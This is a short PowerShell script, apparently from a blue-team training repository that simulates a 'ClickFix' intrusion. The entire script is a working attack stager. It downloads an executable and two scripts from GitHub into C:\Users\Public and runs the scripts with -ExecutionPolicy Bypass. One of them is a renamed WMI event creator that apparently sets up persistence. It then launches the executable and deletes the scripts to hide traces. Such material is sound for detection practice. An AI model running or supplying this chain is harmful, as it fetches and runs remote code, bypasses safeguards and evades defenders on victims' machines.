Invoke-WebRequest "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/main/clickfix/c723561.exe" -OutFile "C:\Users\Public\c723561.exe"
Invoke-WebRequest "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/main/clickfix/sprint.ps1" -OutFile "C:\Users\Public\sprint.ps1"
Invoke-WebRequest "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/main/clickfix/wmieventcreator.ps1" -OutFile "C:\Users\Public\silly.ps1"

powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\sprint.ps1
powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\silly.ps1

Start-Process "C:\Users\Public\c723561.exe"

Remove-Item C:\Users\Public\sprint.ps1
Remove-Item C:\Users\Public\silly.ps1
Remove-Item C:\Users\Public\SED.ps1
